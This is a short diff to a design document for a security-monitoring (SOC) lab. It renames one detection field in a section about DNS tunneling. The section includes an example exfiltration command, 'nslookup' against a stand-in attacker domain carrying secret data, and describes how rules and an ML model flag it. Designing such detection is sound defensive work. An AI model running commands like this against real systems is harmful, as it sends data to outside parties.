@@ -39,7 +39,7 @@ To demonstrate the versatility of the SOC (specifically its ability to monitor a
 ### C. ~~DNS Server (Covert Channels)~~
 - **Service:** A simple `bind9` or `coredns` container exposed on port 53 (UDP).
 - **Attack:** **DNS Tunneling / Exfiltration** (encoding stolen data inside DNS queries, e.g., `nslookup secret-data-123.attacker.com`).
-- **SOC Behavior:** Packetbeat parses DNS requests. The Detection Engine will use stateless rules to flag unusually long DNS query strings. The ML model will flag the high `url_variance` (since every query contains unique exfiltrated data).
+- **SOC Behavior:** Packetbeat parses DNS requests. The Detection Engine will use stateless rules to flag unusually long DNS query strings. The ML model will flag the high `variance_score` (since every query contains unique exfiltrated data).
 
 ## 3. Automated Incident Response (IR) Service
 
